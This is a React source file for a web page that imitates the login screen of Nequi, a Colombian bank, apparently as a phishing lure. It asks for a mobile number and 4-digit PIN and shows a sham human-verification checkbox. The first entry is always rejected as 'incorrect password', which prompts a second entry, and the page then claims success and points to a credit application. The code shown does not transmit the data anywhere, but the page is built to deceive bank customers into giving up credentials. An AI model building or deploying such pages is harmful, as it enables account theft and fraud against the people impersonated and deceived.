import { useState } from 'react';
import { ChevronDown, CheckCircle, XCircle } from 'lucide-react';

function App() {
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [confirmed, setConfirmed] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  const isFormValid = phone.length === 10 && password.length === 4 && confirmed;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;
    setIsLoading(true);
    setError('');
    await new Promise(resolve => setTimeout(resolve, 15000));
    setIsLoading(false);
    if (attempts === 0) {
      setError('Contraseña incorrecta, intenta nuevamente');
      setAttempts(1);
    } else {
      setSuccess(true);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fce4ec]" style={{ fontFamily: "'Segoe UI', -apple-system, sans-serif" }}>
      {/* Geometric background shapes */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div
          className="absolute bg-[#f8bbd0] opacity-60"
          style={{ top: '8%', right: '4%', width: '220px', height: '220px', borderRadius: '30px', transform: 'rotate(12deg)' }}
        />
        <div
          className="absolute bg-[#f8bbd0] opacity-50"
          style={{ top: '50%', right: '2%', width: '150px', height: '150px', borderRadius: '24px', transform: 'rotate(20deg)' }}
        />
        <div
          className="absolute bg-[#f8bbd0] opacity-40"
          style={{ bottom: '12%', right: '8%', width: '180px', height: '180px', borderRadius: '28px', transform: 'rotate(-8deg)' }}
        />
        <div
          className="absolute bg-[#f8bbd0] opacity-50"
          style={{ top: '30%', left: '2%', width: '130px', height: '130px', borderRadius: '24px', transform: 'rotate(15deg)' }}
        />
      </div>

      {/* Header */}
      <header className="relative z-10 bg-white border-b border-gray-100 shadow-sm">
        <div className="max-w-7xl mx-auto px-6 py-4">
          <div className="flex items-start gap-0.5">
            <span className="w-2 h-2 bg-[#e91e8c] mt-0.5 inline-block flex-shrink-0"></span>
            <span className="text-[#1a0533] text-2xl font-black tracking-tight">Nequi</span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="relative z-10 flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md">
          <div className="bg-white rounded-2xl shadow-lg p-8 md:p-10">
            {/* Title */}
            <div className="text-center mb-8">
              <h1 className="text-3xl font-bold text-[#1a0533] mb-3">
                Entra a tu Nequi
              </h1>
              <p className="text-[#e91e8c] text-sm font-medium">
                Podrás bloquear tu Nequi, consultar tus datos.
              </p>
            </div>

              {success ? (
                <div className="text-center py-6">
                  <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg className="w-8 h-8 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <h2 className="text-2xl font-bold text-[#1a0533] mb-3">Inicio de sesión exitoso</h2>
                  <p className="text-gray-600 text-sm leading-relaxed">
                    Puedes continuar con tu solicitud de crédito.
                  </p>
                </div>
              ) : (
              <>
              {error && (
                <div className="flex items-center gap-2 bg-red-50 border border-red-200 rounded-lg px-4 py-3 mb-4">
                  <XCircle className="w-5 h-5 text-red-500 flex-shrink-0" />
                  <span className="text-red-700 text-sm font-medium">{error}</span>
                </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-4">
              {/* Phone Field */}
              <div className="flex items-center border border-gray-200 rounded-lg overflow-hidden bg-white">
                <div className="flex items-center gap-1.5 px-3 py-3.5 border-r border-gray-200 flex-shrink-0 cursor-pointer hover:bg-gray-50">
                  {/* Colombian flag */}
                  <div className="w-7 h-5 rounded overflow-hidden flex flex-col flex-shrink-0">
                    <div className="flex-[2] bg-[#FCD116]"></div>
                    <div className="flex-1 bg-[#003893]"></div>
                    <div className="flex-1 bg-[#CE1126]"></div>
                  </div>
                  <span className="text-gray-700 text-sm font-medium">+57</span>
                  <ChevronDown className="w-3.5 h-3.5 text-gray-400" />
                </div>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => {
                    const digits = e.target.value.replace(/\D/g, '').slice(0, 10);
                    if (digits.length === 0 || digits.startsWith('3')) setPhone(digits);
                  }}
                  placeholder="Número de celular"
                  className="flex-1 px-4 py-3.5 text-sm text-gray-700 placeholder-gray-400 outline-none bg-transparent"
                />
              </div>

              {/* Password Field */}
              <div className="border border-gray-200 rounded-lg bg-white">
                <input
                  type="password"
                  inputMode="numeric"
                  value={password}
                  onChange={(e) => setPassword(e.target.value.replace(/\D/g, '').slice(0, 4))}
                  placeholder="Contraseña"
                  className="w-full px-4 py-3.5 text-sm outline-none bg-transparent rounded-lg placeholder-[#e91e8c]"
                  style={{ color: password ? '#1a0533' : undefined }}
                />
              </div>

              {/* Human Verification */}
              <button
                type="button"
                onClick={() => setConfirmed(!confirmed)}
                className={`w-full flex items-center gap-4 px-5 py-4 rounded-xl border-2 transition-all duration-200 text-left ${
                  confirmed
                    ? 'border-[#e91e8c] bg-pink-50'
                    : 'border-gray-200 bg-white hover:border-pink-300'
                }`}
              >
                <div className="flex-shrink-0">
                  {confirmed ? (
                    <CheckCircle className="w-10 h-10 text-[#e91e8c]" strokeWidth={1.5} />
                  ) : (
                    <div className="w-10 h-10 rounded-full border-2 border-[#e91e8c]"></div>
                  )}
                </div>
                <span className="text-[#e91e8c] text-sm font-medium text-center flex-1">
                  Confirmo que soy una persona<br />real.
                </span>
              </button>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={!isFormValid || isLoading}
                className={`w-full py-4 rounded-xl text-white font-semibold text-base transition-all duration-300 ${
                  isFormValid && !isLoading
                    ? 'bg-[#e91e8c] hover:bg-[#c2185b] hover:shadow-lg hover:shadow-pink-300/40 active:scale-[0.98]'
                    : 'bg-[#f48fb1] cursor-not-allowed'
                }`}
              >
                {isLoading ? (
                  <span className="flex items-center justify-center gap-2">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Ingresando...
                  </span>
                ) : (
                  'Entra'
                )}
              </button>
            </form>
            </>
            )}
          </div>
        </div>
      </main>

      {/* Footer wave */}
      <div className="relative z-10">
        <svg viewBox="0 0 1200 80" preserveAspectRatio="none" className="w-full block" style={{ height: '80px' }}>
          <path d="M0,80 L0,50 Q200,0 400,35 Q600,70 800,30 Q1000,-10 1200,25 L1200,80 Z" fill="#1a0533" />
        </svg>
      </div>
    </div>
  );
}

export default App;
